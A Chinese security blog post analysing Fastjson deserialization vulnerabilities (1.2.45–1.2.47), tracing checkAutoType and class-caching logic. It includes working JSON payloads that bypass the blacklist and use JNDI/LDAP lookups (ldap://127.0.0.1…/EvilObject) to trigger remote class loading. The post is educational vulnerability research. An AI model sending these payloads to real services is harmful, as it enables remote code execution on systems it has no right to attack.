<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="RoboTerh"><meta name="copyright" content="RoboTerh"><meta name="generator" content="Hexo 5.4.0"><meta name="theme" content="hexo-theme-yun"><title>Fastjson反序列化漏洞2 | RoboTerh</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.25/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_dxory92pb0h.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
    const Yun = window.Yun || {};
    window.CONFIG = {"hostname":"roboterh.github.io","root":"/","title":["ROBO","TERH","BLOG","小站"],"version":"1.7.0","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><script>CONFIG.leancloudVisitors = {"enable":true,"app_id":"QzEMTRDcJM476WmFbFsyqtOV-MdYXbMMI","app_key":"Ovrs8D1mvkchhDyViQ6oVoQq","server_url":"https://roboterh.github.io"}</script><script defer src="/js/analytics/leancloud-visitors.js"></script><meta name="description" content="fastjson 1.2.45一个黑名单绕过 &amp;#123;     &quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,     &quot;properties&quot;:&amp;#123;         &quot;data_source&quot;:&quot;ldap:&#x2F;&#x2F;127.0.0.1:23457&#x2F;Command8&quot;     &amp;#125; &amp;#125;">
<meta property="og:type" content="article">
<meta property="og:title" content="Fastjson反序列化漏洞2">
<meta property="og:url" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/index.html">
<meta property="og:site_name" content="RoboTerh">
<meta property="og:description" content="fastjson 1.2.45一个黑名单绕过 &amp;#123;     &quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,     &quot;properties&quot;:&amp;#123;         &quot;data_source&quot;:&quot;ldap:&#x2F;&#x2F;127.0.0.1:23457&#x2F;Command8&quot;     &amp;#125; &amp;#125;">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220401175844931.png">
<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220401180817759.png">
<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220401181751319.png">
<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220401184546628.png">
<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220401185205137.png">
<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220401185403893.png">
<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220401185536518.png">
<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220401185840638.png">
<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220714111209933.png">
<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220714111626350.png">
<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220714145618683.png">
<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220714151415653.png">
<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220714152232914.png">
<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220714152446321.png">
<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220714152639294.png">
<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220714153651528.png">
<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220714154031766.png">
<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220714175935483.png">
<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220714181112733.png">
<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220714181425807.png">
<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220714181615802.png">
<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220714223056778.png">
<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220714223607711.png">
<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220715101135742.png">
<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220715153852730.png">
<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220715154922130.png">
<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220715155238368.png">
<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220715155820846.png">
<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220715160125578.png">
<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220715160305785.png">
<meta property="og:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220715160439043.png">
<meta property="article:published_time" content="2022-04-01T04:31:52.000Z">
<meta property="article:modified_time" content="2022-07-16T13:45:30.716Z">
<meta property="article:author" content="RoboTerh">
<meta property="article:tag" content="反序列化漏洞">
<meta property="article:tag" content="java代码审计">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://roboterh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/image-20220401175844931.png"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="RoboTerh"><img width="96" loading="lazy" src="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/8@XK~G6IIG(3~I6J~C6M4JB.png" alt="RoboTerh"><span class="site-author-status" title="wwww我好菜">-_-</span></a><div class="site-author-name"><a href="/about/">RoboTerh</a></div><span class="site-name">RoboTerh</span><sub class="site-subtitle"></sub><div class="site-desciption">无聊的时候记录记录自己的学习啊</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">50</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">16</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">36</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/F0A770ED0C75BC233DA1034B4C80E8DA.png" title="QQ" target="_blank" style="color:#181717"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:2865153524@qq.com" title="E-Mail" target="_blank" style="color:8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson-1-2-45"><span class="toc-number">1.</span> <span class="toc-text">fastjson 1.2.45</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-25-lt-fastjson-lt-1-2-47"><span class="toc-number">2.</span> <span class="toc-text">1.2.25&lt;&#x3D;fastjson&lt;&#x3D;1.2.47</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson-lt-1-2-68"><span class="toc-number">3.</span> <span class="toc-text">fastjson &lt;&#x3D; 1.2.68</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E4%B8%8A%E4%B8%AA%E7%89%88%E6%9C%AC%E7%9A%84%E4%BF%AE%E5%A4%8D"><span class="toc-number">3.1.</span> <span class="toc-text">对上个版本的修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.3.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E4%BD%93"><span class="toc-number">3.3.1.</span> <span class="toc-text">总体</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%86%E8%8A%82"><span class="toc-number">3.3.2.</span> <span class="toc-text">细节</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">3.4.</span> <span class="toc-text">利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDI"><span class="toc-number">3.4.1.</span> <span class="toc-text">JNDI</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Payload"><span class="toc-number">3.4.1.1.</span> <span class="toc-text">Payload</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99"><span class="toc-number">3.4.2.</span> <span class="toc-text">文件读写</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">3.4.2.1.</span> <span class="toc-text">写文件</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#payload1"><span class="toc-number">3.4.2.1.1.</span> <span class="toc-text">payload1</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#payload2"><span class="toc-number">3.4.2.1.2.</span> <span class="toc-text">payload2</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B8%85%E7%A9%BA%E6%96%87%E4%BB%B6"><span class="toc-number">3.4.2.2.</span> <span class="toc-text">清空文件</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#payload"><span class="toc-number">3.4.2.2.1.</span> <span class="toc-text">payload</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson-lt-1-2-80"><span class="toc-number">4.</span> <span class="toc-text">fastjson &lt;&#x3D; 1.2.80</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E4%B8%8A%E4%B8%AA%E7%89%88%E6%9C%AC%E7%9A%84%E4%BF%AE%E5%A4%8D-1"><span class="toc-number">4.1.</span> <span class="toc-text">对上个版本的修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://RoboTerh.github.io/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="RoboTerh"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="RoboTerh"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">Fastjson反序列化漏洞2</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="Created: 2022-04-01 12:31:52" itemprop="dateCreated datePublished" datetime="2022-04-01T12:31:52+08:00">2022-04-01</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-2-line"></use></svg></span> <time title="Modified: 2022-07-16 21:45:30" itemprop="dateModified" datetime="2022-07-16T21:45:30+08:00">2022-07-16</time></div><span class="leancloud_visitors" id="/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/" data-flag-title="Fastjson反序列化漏洞2"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Views"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span class="leancloud-visitors-count"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Java/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Java</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">反序列化漏洞</span></a><a class="tag-item" href="/tags/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">java代码审计</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><h2 id="fastjson-1-2-45"><a href="#fastjson-1-2-45" class="headerlink" title="fastjson 1.2.45"></a>fastjson 1.2.45</h2><p>一个黑名单绕过</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">&#123;</span>
    <span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory"</span><span class="token punctuation">,</span>
    <span class="token string">"properties"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
        <span class="token string">"data_source"</span><span class="token operator">:</span><span class="token string">"ldap://127.0.0.1:23457/Command8"</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="1-2-25-lt-fastjson-lt-1-2-47"><a href="#1-2-25-lt-fastjson-lt-1-2-47" class="headerlink" title="1.2.25&lt;=fastjson&lt;=1.2.47"></a>1.2.25&lt;=fastjson&lt;=1.2.47</h2><p>在这个版本中可以在不开启<code>AutoTypeSupport</code>的情况下，进行反序列化利用</p>
<p>在这个版本的<code>ParserConfig#checkAutoType</code>中</p>
<p><img src="image-20220401175844931.png" alt="image-20220401175844931" loading="lazy"></p>
<p>在<code>AutoType</code>为false的时候，前面如果为true的if语句就跳过了，但是在进入第二个如果其为false的if语句之前，尝试使用<code>TypeUtils#getClassFromMapping</code>和<code>deserializers.findClass</code>来查找需要反序列化的类，如果找到，就不会进入第二个语句</p>
<p>这个链子主要是在<code>TypeUtils#getClassFromMapping</code>这里做文章，但是我们也来看看<code>deserializers</code></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">IdentityHashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Type</span><span class="token punctuation">,</span> <span class="token class-name">ObjectDeserializer</span><span class="token punctuation">></span></span> deserializers<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>他是一个<code>IdentityHashMap</code>，可以在里面添加值得方法有</p>
<ul>
<li><p><code>getDeserializer</code>: 加载特定类或者有JSONType注解的类</p>
<p><img src="image-20220401180817759.png" alt="image-20220401180817759" loading="lazy"></p>
</li>
<li><p><code>initDeserializers()</code>：无入参，在构造方法中调用，写死一些认为没有危害的固定常用类，无法为我们所用。</p>
</li>
<li><p><code>putDeserializer()</code>：被前两个函数调用，我们无法控制入参。</p>
</li>
</ul>
<p>然后看另一个查找类得方法</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//TypeUtils#getClassFromMapping</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">getClassFromMapping</span><span class="token punctuation">(</span><span class="token class-name">String</span> className<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span>mappings<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>从mappings中取值</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//TypeUtils#mappings</span>
<span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ConcurrentMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span><span class="token punctuation">></span></span> mappings <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcurrentHashMap</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">0.75F</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>是一个<code>ConcurrentMap</code>对象</p>
<p>能够赋值得方法有</p>
<ul>
<li><code>addBaseClassMappings()</code>：无入参，加载</li>
<li><code>loadClass()</code>：关键函数</li>
</ul>
<p>这个函数有三个重载</p>
<p><img src="image-20220401181751319.png" alt="image-20220401181751319" loading="lazy"></p>
<ul>
<li><code>Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache)</code>：调用链均在 <code>checkAutoType()</code> 和 <code>TypeUtils</code> 里自调用，略过。</li>
<li><code>Class&lt;?&gt; loadClass(String className)</code>：除了自调用，有一个 <code>castToJavaBean()</code> 方法，暂未研究。</li>
<li><code>Class&lt;?&gt; loadClass(String className, ClassLoader classLoader)</code>：方法调用两个参数的重载方法，并添加参数 true ，也就是会加入参数缓存中</li>
</ul>
<p>在<code>com.alibaba.fastjson.serializer.MiscCodec#deserialze</code>这个类是用来处理一些乱七八糟类的反序列化类，其中就包括 <code>Class.class</code> 类，成为了我们的入口。</p>
<p><img src="image-20220401184546628.png" alt="image-20220401184546628" loading="lazy"></p>
<p>我们来测试一下子，跟进一下他怎么加载到mappings中的</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">pers<span class="token punctuation">.</span>fastjson</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span>JSON<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Fj47_Test</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">"&#123;\"@type\":\"java.lang.Class\",\"val\":\"aaaaa\"&#125;"</span><span class="token punctuation">;</span>
        JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="image-20220401185205137.png" alt="image-20220401185205137" loading="lazy"></p>
<p>调用链如上</p>
<p><img src="image-20220401185403893.png" alt="image-20220401185403893" loading="lazy"></p>
<p>在这里调用了checkAutoType方法进行检查</p>
<p><img src="image-20220401185536518.png" alt="image-20220401185536518" loading="lazy"></p>
<p>由于 deserializers 在初始化时将 <code>Class.class</code> 进行了加载，因此使用 findClass 可以找到，越过了后面 AutoTypeSupport 的检查。</p>
<p><code>DefaultJSONParser.parseObject()</code> 根据不同的 class 类型分配 deserialzer，Class 类型由 <code>MiscCodec.deserialze()</code> 处理</p>
<p><img src="image-20220401185840638.png" alt="image-20220401185840638" loading="lazy"></p>
<p>payload:</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">&#123;</span>
	<span class="token string">"RoboTerh"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
		<span class="token string">"@type"</span><span class="token operator">:</span> <span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span>
		<span class="token string">"val"</span><span class="token operator">:</span> <span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
	<span class="token string">"demo"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
		<span class="token string">"@type"</span><span class="token operator">:</span> <span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span>
		<span class="token string">"dataSourceName"</span><span class="token operator">:</span> <span class="token string">"ldap://127.0.0.1:8888/EvilObject"</span><span class="token punctuation">,</span>
		<span class="token string">"autoCommit"</span><span class="token operator">:</span> <span class="token boolean">true</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="fastjson-lt-1-2-68"><a href="#fastjson-lt-1-2-68" class="headerlink" title="fastjson &lt;= 1.2.68"></a>fastjson &lt;= 1.2.68</h2><h3 id="对上个版本的修复"><a href="#对上个版本的修复" class="headerlink" title="对上个版本的修复"></a>对上个版本的修复</h3><p>在 1.2.47 版本漏洞爆发之后，官方在 1.2.48 对漏洞进行了修复，在 <code>MiscCodec</code> 处理 Class 类的地方，设置了cache 为 false ，并且 <code>loadClass</code> 重载方法的默认的调用改为不缓存，这就避免了使用了 Class 提前将恶意类名缓存进去。</p>
